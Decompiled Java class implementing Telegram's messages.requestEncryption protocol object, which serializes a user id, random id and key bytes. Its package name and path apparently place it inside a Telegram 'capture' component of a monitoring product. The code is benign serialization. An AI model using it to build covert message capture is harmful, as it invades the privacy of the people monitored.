package com.vvt.capture.telegram.internal;

public class TLRPC$TL_messages_requestEncryption
  extends TLObject
{
  public static int constructor = -162681021;
  public byte[] g_a;
  public int random_id;
  public TLRPC.InputUser user_id;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.EncryptedChat.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.user_id.serializeToStream(paramAbstractSerializedData);
    i = this.random_id;
    paramAbstractSerializedData.writeInt32(i);
    byte[] arrayOfByte = this.g_a;
    paramAbstractSerializedData.writeByteArray(arrayOfByte);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_requestEncryption.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */